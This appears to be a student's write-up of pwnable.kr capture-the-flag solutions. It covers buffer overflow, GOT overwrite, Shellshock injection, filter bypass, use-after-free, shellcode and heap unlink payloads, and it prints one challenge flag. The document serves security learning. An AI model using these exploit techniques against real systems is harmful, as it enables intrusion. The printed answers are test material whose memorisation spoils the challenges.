How to access the challenge in the first place:
1. go to pwnable.kr using a web browser
2. get access to a terminal that can use ssh (since I have Windows, I downloaded a Linux VM on VirtualBox)
3. open a terminal and type in the ssh statement in the challenge description
4. you should have access, you can now use terminal commands like ls to look through the beginning levels for files

-----------------------------------------
Fd

int fd = atoi( argv[1] ) - 0x1234;
int len = 0;
len = read(fd, buf, 32);
if(!strcmp("LETMEWIN\n", buf)){
	printf("good job :)\n");
	system("/bin/cat flag");
	exit(0);
}

This is the important part of the code. On first glance, the obvious thing to manipulate is the fd variable, which can be controlled with input. Then you can use the fd in the read method. But how is that relevant? That requires reading up a little more, but basically if fd is 0, then read takes in input from stdin. 

Since fd is subtracted 0x1234 (or 4660), in order to make fd 0, input a 4660.

That doesn't get you the flag, though - the strcmp function checks if buf (or now your input) is equal to LETMEWIN\n, so just type that into the terminal and you should get your flag.

Solution:
4660
LETMEWIN\n

-----------------------------------------
Collision

unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

After looking through the program, I realized that in order to get the flag, the return value of the check_password function must be equivalent to hashcode (0x21DD09EC). But how do I actually get there?

check_password takes in a 20 character string, and essentially reads it in 4 characters at a time and then adds them for the final result. So if you had a string like "\x11" * 20, the return value would be "\x55\x55\x55\x55". So all you basically need to do is come up with five four byte strings that add up to 0x21DD09EC. 

The way I did it makes the five strings add up to 121DD09EC (notice the additional 1 at the front), and it works because res only accounts for the last 8 digits.

I initially came up with the string of "\x33" * 16 + "\x20\x3d\x10\x55", but the final string ends with a 20 (little-endian makes the actual string 55103d20). 
I soon realized though that the program had issues with 0 ending the string, so I had to ensure that the final byte wasn't a 0 in each of the four byte strings. So, I instead had to do "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55".

Solution:
./col $(python -c 'print "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55"')


-----------------------------------------
Bof

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

So this particular challenge talked about the issue of buffer overflow. The first thing to realize is that the array overflowme doesn't have a size limit, and as such, giving the array more than 32 characters makes the data you put in overflow into memory you're not supposed to have access to. So we want to overflow the value of key, which currently is 0xdeadbeef, with the value of 0xcafebabe, so that we can end up with a shell. 

The problem now is how much I need to overflow before I can finally access the memory for key. I could just randomly put in A's and then add in a \xfe\xca\xbe\ba, but I instead used gdb to find the exact value. 

I booted up gdb and disassembled the func function to get this in assembly:
gdb-peda$ disas func
Dump of assembler code for function func:
   0x8000062c <+0>:	push   ebp
   0x8000062d <+1>:	mov    ebp,esp
   0x8000062f <+3>:	sub    esp,0x48
=> 0x80000632 <+6>:	mov    eax,gs:0x14
   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:	xor    eax,eax
   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:	call   0xb7e630d0 <_IO_puts>
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e62820 <_IO_gets>
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:	jne    0x8000066b <func+63>
   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:	call   0xb7e3e850 <__libc_system>
   0x80000669 <+61>:	jmp    0x80000677 <func+75>
   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:	call   0xb7e630d0 <_IO_puts>
   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:	je     0x80000688 <func+92>
   0x80000683 <+87>:	call   0xb7ef9560 <__stack_chk_fail>
   0x80000688 <+92>:	leave  
   0x80000689 <+93>:	ret   

The important line in all the assembly above is 0x80000654, or func+40. That line compares the value of ebp+8 (presumably key's memory location) with the value of 0xcafebabe. So I set a breakpoint there.

On the way to accessing the breakpoint, I was asked to give input for the overflow me buffer, which I proceeded to overflow with a random amount of A's.

At the breakpoint, I then examine the registers to see where the value of the overflowme variable is.

Since I use gdb-peda, the stack data shown shows me that the variable is at 0xbffff3cc.

0000| 0xbffff3b0 --> 0xbffff3cc ('A' <repeats 47 times>)
0004| 0xbffff3b4 --> 0xbffff454 --> 0x3b2cb624 
0008| 0xbffff3b8 --> 0xb7fb3000 --> 0x1aedb0 
0012| 0xbffff3bc --> 0x9027 
0016| 0xbffff3c0 --> 0xffffffff 
0020| 0xbffff3c4 --> 0x2f ('/')
0024| 0xbffff3c8 --> 0xb7e10dc8 --> 0x2b76 ('v+')
0028| 0xbffff3cc ('A' <repeats 47 times>)

Since I know that overflowme is at 0xbffff3cc and $ebp+8 (aka key variable) is at 0xbffff400, I can calculate that 0xbffff400 - 0xbffff3cc = 52. So I need to overflow 52 characters into overflowme and then add 0xcafebabe to finally overwrite the key variable.

In the solution below, besides the standard python script, the ; cat - is necessary to keep the program open while I utilize the open shell.

Solution:
(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000


-----------------------------------------
Flag

So, I initially tried to open the file in GDB, then tried to disassemble the main function. However, GDB told me that it couldn't locate the file in question, which was weird. So I instead took an alternate approach and used the strings command on the flag program, which quickly revealed to me in this particular part of the output:

ACG?
'_(H
USQRH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
_j<X
Ph^)-
j2AZE)
/proc/self/exe

that the flags executable was packed with UPX. So I unpacked with UPX (upx -d ./flag) to get a file I can actually disassemble.

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:	push   rbp
   0x0000000000401165 <+1>:	mov    rbp,rsp
   0x0000000000401168 <+4>:	sub    rsp,0x10
   0x000000000040116c <+8>:	mov    edi,0x496658
   0x0000000000401171 <+13>:	call   0x402080 <puts>
   0x0000000000401176 <+18>:	mov    edi,0x64
   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:	mov    rsi,rdx
   0x0000000000401192 <+46>:	mov    rdi,rax
   0x0000000000401195 <+49>:	call   0x400320
   0x000000000040119a <+54>:	mov    eax,0x0
   0x000000000040119f <+59>:	leave  
   0x00000000004011a0 <+60>:	ret    
End of assembler dump.
gdb-peda$ x/10s *0x6c2070
0x496628:	"UPX...? sounds like a delivery service :)"
0x496652:	""
0x496653:	""
0x496654:	""
0x496655:	""
0x496656:	""
0x496657:	""
0x496658:	"I will malloc() and strcpy the flag there. take it."
0x49668c:	"FATAL: kernel too old\n"
0x4966a3:	"/dev/urandom"

The searching for the actual flag was made easier by the comment found in the disassembly.

Solution:
upx -d ./flag
gdb flag
x/10s *0x6c2070

-----------------------------------------
Passcode

Error: I kept piping in input and then wondering why the scanf method refused to accept further input... goes to show that I"m a dumbass and still have a lot to learn. Piped in input essentially is all the input the program's going to receive. Welp. Learned something new.

So the first thing I did was run the program - I checked if passcode could accept 338150 (which it couldn't, it seg faulted). So I then decided to take a look at the welcome function. I wasn't really sure what to expect, but I filled the name array with 100 A's (the welcome function limited input size), and took a look in GDB.

I found that the passcode1 variable is at $ebp-10, passcode2 variable is at $ebp-0c, and that the name array is at $ebp-70. Since the offsets are in hex, 0x70-0x10 = 96. This means that the remaining 4 spots are unaccounted for, and that I'm able to control the value for passcode1. As evidence, when I tested passcode1's value in GDB, it was 0x41414141, which is hex for AAAA.

However, just this alone isn't enough.

printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

The above code in the login function also possesses a bug: scanf should accept &passcode1, not passcode1. As a result, scanf will read in a value and store it at the memory position with passcode1's value. This means that I now can write any value to any place in memory.

Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
=> 0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>


The way I did it, I used login+47 (the call to fflush) as a basis to find what to overwrite. Since login+47 calls (or jumps to) the position at 0x8048430, I can instead overwrite the position (which I don't know and shouldn't matter) with login+127's value, which is essentially just system("/bin/cat flag").

Another thing that tripped me was the scanf accepted only %d, so that attempting to give it the hex value for login+127 wouldn't work. Therefore, you have to convert login+127 (0x080485e3) to its decimal component, 134514147.

Solution:
(python -c 'print "A" *96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode

-----------------------------------------
Random

So the hint given was that random isn't really random. So I booted up GDB, and took a look at the disassembly:

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   %rbp
   0x00000000004005f5 <+1>:	mov    %rsp,%rbp
   0x00000000004005f8 <+4>:	sub    $0x10,%rsp
   0x00000000004005fc <+8>:	mov    $0x0,%eax
   0x0000000000400601 <+13>:	callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:	movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:	mov    $0x400760,%eax
   0x0000000000400615 <+33>:	lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:	mov    %rdx,%rsi
   0x000000000040061c <+40>:	mov    %rax,%rdi
   0x000000000040061f <+43>:	mov    $0x0,%eax
   0x0000000000400624 <+48>:	callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:	xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:	cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    $0x400763,%edi
   0x000000000040063b <+71>:	callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    $0x400769,%edi
   0x0000000000400645 <+81>:	mov    $0x0,%eax
   0x000000000040064a <+86>:	callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    $0x0,%eax
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    $0x400778,%edi
   0x000000000040065b <+103>:	callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    $0x0,%eax
   0x0000000000400665 <+113>:	leaveq 
   0x0000000000400666 <+114>:	retq   

I see that the key ^ random line takes place at main+56, or the xor command. From that, I can figure out that key is either %rbp-4 or $rbp-8. I just randomly inputted a value and reran the program (changing input values) to figure out that key is located at $rbp-8. This means that $rbp-4 is the random value. I ran the program several times, and each time, $rbp-4 seemed to have the value of 0x6b8b4567.

I then xor'd 0x6b8b4567 with 0xdeadbeef to get 0xb526fb88. However, the job still isn't done, as key accepts an integer value. So I convert 0xb526fb88 to 3039230856 to get my final answer.

Solution:
3039230856

-----------------------------------------
Input - (AKA I don't know how sockets work)

Error: I incorrectly thought that argc was related to the length of the string. Whups. It's actually the amount of arguments (which must be separated by a space - the part I forgot).

Another notable mistake was that I got too caught up in attempting to treat the 0x00 as an actual hex value, rather than the string that it actually was...

You need to set up an actual socket connection (nc -l -k -p 2223 in my case) in order to actually connect to it. Lol, I'm a socket noob.

Below's the working python script as long as the file is on your computer (I understand that the file won't necessarily work as I don't have write permissions on the other server)

This is more of a syntax challenge, which I really don't like personally (because I know jack about syntax).

import struct, os, sys, socket
from subprocess import *

list = ['./a.out']

for i in range(99):
  list.append('A')

list[65] = ''
list[66] = '\x20\x0a\x0d'
list[67] = "2222"

r, w = os.pipe()
r1, w1 = os.pipe()

my_env = os.environ.copy()
my_env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"

p = Popen(list, stdin=r1, stderr=r, env=my_env)

os.write(w1, "\x00\x0a\x00\xff")
os.write(w, "\x00\x0a\x02\xff")

f = open("\x0a", 'wb')
f.write("\x00\x00\x00\x00")
f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 2222))
s.send("\xde\xad\xbe\xef")
s.close()

print(p.communicate()[0])

Solution:
Come back to it later...

-----------------------------------------
Leg

key1: it seems to be essentially returning the value of the pc. (0x8cdc)
   0x00008cdc <+8>:  mov   r3, pc
   0x00008ce0 <+12>: mov   r0, r3
   0x00008ce4 <+16>: sub   sp, r11, #0

key2: it seems to return pc + 4 (0x8d04 + 4)
   0x00008d04 <+20>: mov   r3, pc
   0x00008d06 <+22>: adds  r3, #4
   0x00008d08 <+24>: push  {r3}
   0x00008d0a <+26>: pop   {pc}
   0x00008d0c <+28>: pop   {r6}     ; (ldr r6, [sp], #4)
   0x00008d10 <+32>: mov   r0, r3

key3: it returns lr, register containing the return address of the function (0x8d80)
   0x00008d28 <+8>:  mov   r3, lr
   0x00008d2c <+12>: mov   r0, r3

   (main function key3 call)
   0x00008d7c <+64>: bl 0x8d20 <key3>
   0x00008d80 <+68>: mov   r3, r0


= 1A764 (or 108388)

So, the main mistake I made in the comments above is that I don't know ARM (I tried to read it like x86 assembly).

The main thing that I needed to know is that pc doesn't reference the current instruction, but the address of the 2nd instruction after the current one.


So, the more correct version would be 0x8cdc (+ 8 due to ARM pc characteristics) + 0x8d04 + 4 (+ 4 as I skip 2 instructions, not 2 bytes, check above code if confused) + 0x8d80 (lr unaffected).

This gives:  0x8d04+8+0x8cdc+8+0x8d80 = 108400

Solution:
108400

-----------------------------------------
Mistake

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
   int i;
   for(i=0; i<len; i++){
      s[i] ^= XORKEY;
   }
}

int main(int argc, char* argv[]){
   
   int fd;
   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

   printf("do not bruteforce...\n");
   sleep(time(0)%20);

   char pw_buf[PW_LEN+1];
   int len;
   if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
      printf("read error\n");
      close(fd);
      return 0;      
   }

   char pw_buf2[PW_LEN+1];
   printf("input password : ");
   scanf("%10s", pw_buf2);

   // xor your input
   xor(pw_buf2, 10);

   if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
      printf("Password OK\n");
      system("/bin/cat flag\n");
   }
   else{
      printf("Wrong Password\n");
   }

   close(fd);
   return 0;
}

So, at first glance, I don't see anything wrong. Given the hints put out, I understand that the issue is most likely a operator problem. However, as I have little experience with fd in c, I don't understand what to do.

I instead copied the c code onto my own machine so I could compile a new program. When I reran the new program, though, I noticed that the program was accepting input twice.

A little more looking revealed that fd was 0 after this line of code:

   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

This meant that pw_buf was reading in from input, as well as pw_buf2. So I just need to give two inputs ten characters wide that when xor'd give each other as answers. So I used AAAAAAAAAA (41414141414141414141) and @@@@@@@@@@ (40404040404040404040).

Solution:
AAAAAAAAAA
@@@@@@@@@@


-----------------------------------------
Shellshock

#include <stdio.h>
int main(){
   setresuid(getegid(), getegid(), getegid());
   setresgid(getegid(), getegid(), getegid());
   system("/home/shellshock/bash -c 'echo shock_me'");
   return 0;
}

I have no idea where to start. So I looked up a bit on Wikipedia, and I found this line of code: 
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test".

Supposedly it exploits the shellshock bug, but when I type it into the console, nothing happens when I run the shellshock program. I realize I'm missing something - I look a little further and I see that setresuid() might have a vulnerability with the environment variables... but I have no idea how to make that work.

So, after a little bit of research, I found out you're supposed to use export to bring the environment variable in. 

So the more appropriate solution would be:
export x='() { :;}; /bin/cat flag'. (the latter half of the code above was just a test)

Solution:
export x='() { :;}; /bin/cat flag'
./shellshock

-----------------------------------------
coin1

   ---------------------------------------------------
   -              Shall we play a game?              -
   ---------------------------------------------------
   
   You have given some gold coins in your hand
   however, there is one counterfeit coin among them
   counterfeit coin looks exactly same as real coin
   however, its weight is different from real one
   real coin weighs 10, counterfeit coin weighes 9
   help me to find the counterfeit coin with a scale
   if you find 100 counterfeit coins, you will get reward :)
   FYI, you have 30 seconds.
   
   - How to play - 
   1. you get a number of coins (N) and number of chances (C)
   2. then you specify a set of index numbers of coins to be weighed
   3. you get the weight information
   4. 2~3 repeats C time, then you give the answer
   
   - Example -
   [Server] N=4 C=2  # find counterfeit among 4 coins with 2 trial
   [Client] 0 1      # weigh first and second coin
   [Server] 20       # scale result : 20
   [Client] 3        # weigh fourth coin
   [Server] 10       # scale result : 10
   [Client] 2        # counterfeit coin is third!
   [Server] Correct!

   - Ready? starting in 3 sec... -

N=676 C=10

So, from an early look at this, I figure that I probably need to write a script to deal with this.

My initial approach used a binary search to attempt to look for the coin, as in the example above. 

The script that I used can be found under the name of root.py, which should be in the same folder this writeup is in. I also had to login to one of pwnable.kr's previous challenges and nc 0 9007 to it from there as my connection was too slow originally.

Solution:
ssh mistake@pwnable.kr -p2222 (any ssh to pwnable should be fine)
cd /tmp/
vim root.py
Copy/Paste
python root.py

-----------------------------------------
blackjack

Solution:
Just bet a negative amount of money and lose.

-----------------------------------------
lotto
   
   // calculate lotto score
   int match = 0, j = 0;
   for(i=0; i<6; i++){
      for(j=0; j<6; j++){
         if(lotto[i] == submit[j]){
            match++;
         }
      }
   }


The nested for loop has problems. I just need to input a number with six of the same bytes and hope that one of the bytes is in the random number.

In this case, I just repeatedly entered !!!!!! for my lotto input in the hopes that !(ASCII 33) would be one of the randomly chosen numbers. 

Solution:
!!!!!! (until it outputs flag)

-----------------------------------------
cmd1

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "flag")!=0;
   r += strstr(cmd, "sh")!=0;
   r += strstr(cmd, "tmp")!=0;
   return r;
}
int main(int argc, char* argv[], char** envp){
   putenv("PATH=/fuckyouverymuch");
   if(filter(argv[1])) return 0;
   system( argv[1] );
   return 0;
}

What's happening in this program is that filter is checking if the argument given has flag, sh, or tmp, in it. If it does, it immediately exits the program. This prevents us from just typing in something like "cat flag" for the argument.

I messed around a bit before determining that since there is no /fuckyouverymuch directory, I would be better off just bypassing the filter. So I did 
./cmd1 "/bin/cat f*" to find the flag.

Solution:
./cmd1 "/bin/cat f*"
mommy now I get what PATH environment is for :)

-----------------------------------------
cmd2

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "=")!=0;
   r += strstr(cmd, "PATH")!=0;
   r += strstr(cmd, "export")!=0;
   r += strstr(cmd, "/")!=0;
   r += strstr(cmd, "`")!=0;
   r += strstr(cmd, "flag")!=0;
   return r;
}

extern char** environ;
void delete_env(){
   char** p;
   for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
   delete_env();
   putenv("PATH=/no_command_execution_until_you_become_a_hacker");
   if(filter(argv[1])) return 0;
   printf("%s\n", argv[1]);
   system( argv[1] );
   return 0;
}

So, this isn't something I found out on my own, but if you change directory to the topmost parent and call pwd, pwd just returns a /. 

This actually makes the problem so much easier. I just did what you normally do when you try to cat a flag in a folder and replaced the slashes with \$(pwd).

/bin/cat /home/cmd2/f* (I use f* b/c I can't type flag b/c of the filter)

So I would use \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*. (don't forget the two cd ..; statements to access the topmost parent).

Solution:
./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*"

-----------------------------------------
uaf -- go over this again, you're (me) rusty as hell

#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
   virtual void give_shell(){
      system("/bin/sh");
   }
protected:
   int age;
   string name;
public:
   virtual void introduce(){
      cout << "My name is " << name << endl;
      cout << "I am " << age << " years old" << endl;
   }
};

class Man: public Human{
public:
   Man(string name, int age){
      this->name = name;
      this->age = age;
        }
        virtual void introduce(){
      Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
   Human* m = new Man("Jack", 25);
   Human* w = new Woman("Jill", 21);

   size_t len;
   char* data;
   unsigned int op;
   while(1){
      cout << "1. use\n2. after\n3. free\n";
      cin >> op;

      switch(op){
         case 1:
            m->introduce();
            w->introduce();
            break;
         case 2:
            len = atoi(argv[1]);
            data = new char[len];
            read(open(argv[2], O_RDONLY), data, len);
            cout << "your data is allocated" << endl;
            break;
         case 3:
            delete m;
            delete w;
            break;
         default:
            break;
      }
   }

   return 0;   
}

OK, so I needed a little help with this one. After a lot of experimentation and help from Google, I was able to actually decently figure what was going on. It's these few lines in GDB (if you disassemble the main function) that are the trick to solving the problem:

   0x0000000000400fcd <+265>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>: mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>: add    rax,0x8
=> 0x0000000000400fd8 <+276>: mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>: mov    rdi,rax
   0x0000000000400fe2 <+286>: call   rdx

But the problem is getting your saved data value into $rbp-0x38. So I had to experiment with the order of 1, 2, and 3 commands. I know that 3 comes before 1 (so I can abuse the uaf bug), but I don't know how 3 or 2 relate. So I ran GDB multiple times, testing registers before I realized that 3 must be called first, and 2 must be then called twice or more. For some reason one 2 call wasn't enough... I'm assuming that the data needed to be stacked to a certain point on the memory, and one call asn't enough to do that.

So I had to call the program in 3, 2, 2, 1.

The data I input would also then be put into $rbp-0x38, which then according to the assembly, (*rbp-0x38 + 8) would be called by the program. So I obviously want to call the give_shell function in the code, which when examined in the readelf output reveals the vtable to be at 0x401560, and give_shell to beat 0x40117a.

root@kali:~/Downloads# readelf uaf -a | grep Man | c++filt
    57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 typeinfo for Man
    78: 00000000004015c8     5 OBJECT  WEAK   DEFAULT   15 typeinfo name for Man
    83: 0000000000401560    32 OBJECT  WEAK   DEFAULT   15 vtable for Man
    94: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   100: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   110: 00000000004012d2    54 FUNC    WEAK   DEFAULT   13 Man::introduce()

root@kali:~/Downloads# readelf uaf -a | grep give_shell | c++filt
    85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 Human::give_shell()

A little looking in GDB reveals that the give_shell value is stored in 0x401570, or vtable+16.

gdb-peda$ x/10x 0x401560
0x401560 <_ZTV3Man>: 0x00000000  0x00000000  0x004015d0  0x00000000
0x401570 <_ZTV3Man+16>: 0x0040117a  0x00000000  0x004012d2  0x00000000
0x401580 <_ZTV5Human>:  0x00000000  0x00000000

So since the program calls (*rbp-0x38 + 8), I need to subtract 8 from 0x401570 to get 0x401568 as my input.

Solution:
(python -c 'print "\x68\x15\x40\x00" + "\x00" * 4') > /tmp/test
./uaf 8 /tmp/test (8 is just the size of a byte)
3
2
2
1

Tips I learned: set print asm-demangle on (C++, makes things legible)
                use readelf when unable to find function locations
                (readelf -a uaf | grep Man | c++filt in this case)
                scp -P2222 uaf@pwnable.kr:uaf /root/Downloads to copy from pwnable.kr


-----------------------------------------
codemap

You need IDA Pro codemap. I'll come back when I have it. or not...



-----------------------------------------
memcpy

So, for this particular challenge, I had no idea what to do, so I just bruteforced it with a script. Luckily enough, it didn't take much to bruteforce. As for my script, I wrote a really lazy version where I initially started out with an array like:
[8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]
and I would increment a certain position depending on the program output.

For example, if the output stopped on experiment 5, that most likely meant the value in input[3] was off. So I had a loop (it's in memcpy.py, a very lazily written script) that kept incrementing input[3] until I got the text output for experiment 6 (or at least part of it). That means the value in input[4] was off. So I continued on and on until I got the flag.

flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
(just because I really don't want to brute force it again)

Solution:
python memcpy.py
(then edit script as necessary)

-----------------------------------------
asm

from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)


print(shellcode)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
output = p.recvline()
print(output)

I found a really convenient way to send shellcode online. Obviously I'm keeping this saved (not my work ofc) for future reference here.


-----------------------------------------
unlink

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
   struct tagOBJ* fd;
   struct tagOBJ* bk;
   char buf[8];
}OBJ;

void shell(){
   system("/bin/sh");
}

void unlink(OBJ* P){
   OBJ* BK;
   OBJ* FD;
   BK=P->bk;
   FD=P->fd;
   FD->bk=BK;
   BK->fd=FD;
}
int main(int argc, char* argv[]){
   malloc(1024);
   OBJ* A = (OBJ*)malloc(sizeof(OBJ));
   OBJ* B = (OBJ*)malloc(sizeof(OBJ));
   OBJ* C = (OBJ*)malloc(sizeof(OBJ));

   // double linked list: A <-> B <-> C
   A->fd = B;
   B->bk = A;
   B->fd = C;
   C->bk = B;

   printf("here is stack address leak: %p\n", &A);
   printf("here is heap address leak: %p\n", A);
   printf("now that you have leaks, get shell!\n");
   // heap overflow!
   gets(A->buf);

   // exploit this unlink!
   unlink(B);
   return 0;
}

=> 0x8048521 <unlink+29>:  mov    DWORD PTR [eax+0x4],edx

Program's segfaulting here after flooding it with AAAAAA input.
It's trying to store the value of edx ("AAAA") into memory address (0x41414141 + 4).
Obviously, there's a lot of potential here... I just need to figure out how to control it.

So I send it
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

gdb-peda$ x/x $eax+0x4
0x45454549: Cannot access memory at address 0x45454549
gdb-peda$ info registers
eax            0x45454545  0x45454545
ecx            0xfbad2288  0xfbad2288
edx            0x46464646  0x46464646
ebx            0x0   0x0
esp            0xbfeb8a28  0xbfeb8a28
ebp            0xbfeb8a38  0xbfeb8a38
esi            0x1   0x1
edi            0xb76ea000  0xb76ea000
eip            0x8048521   0x8048521 <unlink+29>
eflags         0x286 [ PF SF IF ]
cs             0x73  0x73
ss             0x7b  0x7b
ds             0x7b  0x7b
es             0x7b  0x7b
fs             0x0   0x0
gs             0x33  0x33

Now I can see that it's trying to store 0x46464646 (FFFF) into $0x45454549 (EEEE + 0x4). 

python -c 'print "AAAA" * 4 + "\x28\x85\x04\x08" + "\xeb\x84\x04\x08"'

python -c 'print "AAAA" * 4 + "\x74\x4f\xfd\xbf" + "AAAA"'

Don't forget to add 4....

Tips: 
Start up GDB
Start up python script, send all the input you need
make sure to include connection.interactive()
locate the PID stated in the script output
